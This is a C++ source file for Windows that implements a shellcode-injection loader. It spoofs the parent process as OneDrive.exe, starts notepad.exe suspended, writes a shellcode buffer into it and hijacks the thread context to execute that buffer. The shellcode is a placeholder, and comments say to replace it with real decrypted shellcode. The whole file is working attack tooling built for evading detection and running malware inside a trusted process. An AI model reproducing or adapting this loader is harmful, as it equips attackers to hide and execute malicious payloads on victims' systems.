#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>

// Replace this with your decrypted shellcode (e.g., from AES decryption)
std::vector<uint8_t> get_shellcode() {
    return {
        0x90, 0x90, 0x90, // NOPs (placeholder)
        0xCC              // INT 3 (breakpoint, replace with real shellcode)
    };
}

DWORD findOneDrivePID() {
    PROCESSENTRY32 entry = { sizeof(entry) };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    while (Process32Next(snapshot, &entry)) {
        if (_stricmp(entry.szExeFile, "OneDrive.exe") == 0) {
            DWORD pid = entry.th32ProcessID;
            CloseHandle(snapshot);
            return pid;
        }
    }

    CloseHandle(snapshot);
    return 0;
}

int main() {
    DWORD parentPID = findOneDrivePID();
    if (!parentPID) {
        std::cerr << "[!] OneDrive.exe not found.\n";
        return 1;
    }

    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPID);
    if (!hParent) {
        std::cerr << "[!] Failed to open OneDrive.exe. Error: " << GetLastError() << "\n";
        return 1;
    }

    // Setup attributes for PPID spoofing
    STARTUPINFOEXA si = { sizeof(STARTUPINFOEXA) };
    PROCESS_INFORMATION pi;
    SIZE_T size = 0;

    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);

    UpdateProcThreadAttribute(
        si.lpAttributeList, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParent, sizeof(HANDLE),
        NULL, NULL
    );

    // Replace with a benign process
    const char* targetProcess = "C:\\Windows\\System32\\notepad.exe";

    if (!CreateProcessA(
        targetProcess, NULL, NULL, NULL,
        FALSE,
        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
        NULL, NULL,
        &si.StartupInfo, &pi)) {
        std::cerr << "[!] Failed to create process. Error: " << GetLastError() << "\n";
        return 1;
    }

    // Shellcode injection
    std::vector<uint8_t> shellcode = get_shellcode();
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) {
        std::cerr << "[!] VirtualAllocEx failed. Error: " << GetLastError() << "\n";
        return 1;
    }

    if (!WriteProcessMemory(pi.hProcess, remoteMem, shellcode.data(), shellcode.size(), NULL)) {
        std::cerr << "[!] WriteProcessMemory failed. Error: " << GetLastError() << "\n";
        return 1;
    }

    DWORD oldProtect;
    VirtualProtectEx(pi.hProcess, remoteMem, shellcode.size(), PAGE_EXECUTE_READ, &oldProtect);

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

#ifdef _WIN64
    ctx.Rip = (DWORD64)remoteMem;
#else
    ctx.Eip = (DWORD)remoteMem;
#endif

    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    // Cleanup
    CloseHandle(hParent);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);

    std::cout << "[+] Injection complete.\n";
    return 0;
}